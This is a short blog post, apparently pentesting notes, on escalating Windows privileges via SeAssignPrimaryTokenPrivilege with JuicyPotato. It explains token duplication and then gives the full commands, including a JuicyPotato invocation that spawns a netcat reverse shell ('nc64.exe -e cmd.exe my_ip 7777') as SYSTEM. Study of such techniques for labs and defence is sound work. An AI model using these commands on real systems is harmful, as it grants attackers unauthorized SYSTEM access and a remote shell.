---
layout: post
title:  "privesc - windows -  seimpersonateprivilege / seassignprimarytokenprivilege - juicypotato"
date:   2022-01-01
categories: windows
---

## Windows - Privileges Escalation - SeAssignPrimaryTokenPrivilege


### Privileges


```powershell

PS C:\Users\user\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeAssignPrimaryTokenPrivilege Replace a process level token  Enabled
...

```

### Explain

SeAssignPrimaryTokenPrivilege is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token. Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx). With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** (in general, you cannot modify the primary token of a running process).


### Juicy Potato & Netcat

```powershell

PS C:\Users\user\Documents> upload /home/kali/privesc/JuicyPotato.exe

PS C:\Users\user\Documents> upload /home/kali/privesc/netcat/nc64.exe

PS C:\Users\user\Documents> .\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\users\user\documents\nc64.exe -e cmd.exe my_ip 7777" -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"

```

### CLSID

```text

For Windows Server 2016 Standard we will use the CLSID for winmgmt LocalService {8BC3F05E-D86B-11D0-A075-00C04FB68820} under NT AUTHORITY\SYSTEM user

````




### Resources

- https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
- http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/

